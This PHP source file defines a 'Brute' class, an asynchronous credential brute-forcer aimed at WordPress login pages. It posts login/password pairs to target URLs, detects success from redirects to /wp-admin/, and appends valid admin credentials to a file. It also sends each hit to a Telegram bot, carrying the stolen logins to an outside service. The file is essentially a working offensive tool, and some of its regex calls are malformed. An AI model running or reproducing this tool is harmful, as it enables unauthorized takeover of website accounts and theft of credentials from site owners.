<?php

namespace app;

use Generator;
use Throwable;
use Amp\Promise;
use Amp\Success;
use Amp\Dns\DnsException;
use Amp\Http\Client\HttpClient;
use Amp\Http\Client\Request;
use Amp\Http\Client\Response;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Monolog\Handler\TelegramBotHandler;
use Monolog\Logger;
use function Amp\call;

class Brute
{
    private HttpClient $client;

    private array $redirectsCache = [];
    private array $found = [];

    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(0)
            ->build();
    }

    private function getCredentials(string $line, string $login, string $password) : ?array
    {
        $parts = explode(';', $line);

        /** Empty URL in line **/
        if (empty($parts[0])) {
            return null;
        }

        $urlPart = $parts[0];
        $loginPart = $parts[1] ?? null;

        $currentLogin = '{login}' === $login ? $loginPart : $login;
        /** Login is empty (placeholder line in logins file) or equals to default login */
        if (null === $currentLogin || ('{login}' !== $login && $loginPart === $login)) {
            return null;
        }

        $currentPassword = '{login}' === $password ? $loginPart : $password;
        /** Password is empty (placeholder line in passwords file) or equals to default password */
        if (null === $currentPassword || ('{login}' !== $password && $loginPart === $currentPassword)) {
            return null;
        }

        return [$urlPart, $currentLogin, $currentPassword];
    }

    private function normalizeUrl(string $url) : Promise
    {
        if (isset($this->redirectsCache[$url])) {
            return is_object($this->redirectsCache[$url]) ? $this->redirectsCache[$url] : new Success($this->redirectsCache[$url]);
        }

        return $this->redirectsCache[$url] = call(function () use ($url) {
            $location = (yield $this->client->request(new Request($url)))
                ->getHeader('Location') ?? $url;

            if ($location === $url) {
                return $this->redirectsCache[$url] = $url;
            }

            if (
                parse_url($location, PHP_URL_SCHEME) !== parse_url($url, PHP_URL_SCHEME)
                || preg_replace('^www\.', '', parse_url($url,  PHP_URL_HOST)) === preg_replace('^www\.', '', parse_url($location,  PHP_URL_HOST))
            ) {
                Log::debug(sprintf('https or www redirect catched %s -> %s', $url, $location));
                $newUrl = preg_replace('#^https?://#i', parse_url($location, PHP_URL_SCHEME) . '://', $url);
                $newUrl = preg_replace('#^(https?://)' . preg_quote(parse_url($url,  PHP_URL_HOST)) . '#i', '$1' . parse_url($location,  PHP_URL_HOST), $url);
                return $this->redirectsCache[$url] = $newUrl;
            }

            if (parse_url($location, PHP_URL_HOST) !== parse_url($url,  PHP_URL_HOST)) {
                Log::warning(sprintf('%s has redirect to different domain: %s', $url, $location));
                return null;
            }

            Log::debug(sprintf('Strange redirect occured %s -> %s', $url, $location));
            return null;
        });
    }

    public function handle(string $url, string $login, string $password) : Generator
    {
        $body = new FormBody();
        $body->addField('log', $login);
        $body->addField('pwd', $password);

        $request = new Request($url, 'POST');
        $request->setTcpConnectTimeout(2400);
        $request->setBody($body);

        $response = yield $this->client->request($request);

        $authorized = count(array_filter(
            $response->getHeaderArray('Location'), 
            fn (string $location) => str_contains($location, '/wp-admin/')
        )) > 0;
        /** TODO: check body for specific classes */

        $wp_admin = "{$url};{$login};{$password}";
        if ($authorized == true) {
            Log::info("Valid: {$wp_admin}");
            file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
            try {
                yield (new Telegram())->sendMessage($wp_admin);
            } catch (\Throwable $t) {
                Log::error(sprintf('Unable to log in telegram due to %s at %s:%d', $t->getMessage(), $t->getFile(), $t->getLine()));
            }

            return true;
        }

        Log::debug("Invalid: {$wp_admin}");
        return false;
    }

    public function __invoke(array $data)
    {
        ['line' => $line, 'login' => $login, 'password' => $password] = $data;
        if (isset($this->found[$line])) {
            return;
        }

        if (null === $credentials = $this->getCredentials($line, $login, $password)) {
            return;
        }

        [$url, $login, $password] = $credentials;

        try {
            if (null === $url = yield $this->normalizeUrl($url)) {
                return;
            }

            if (yield from $this->handle($url, $login, $password)) {
                $this->found[$line] = true;
            }
        } catch (Throwable $t) {
            Log::error(sprintf('Unable to process %s due to %s at %s:%d', json_encode($data), $t->getMessage(), $t->getFile(), $t->getLine()));
        }
    }
}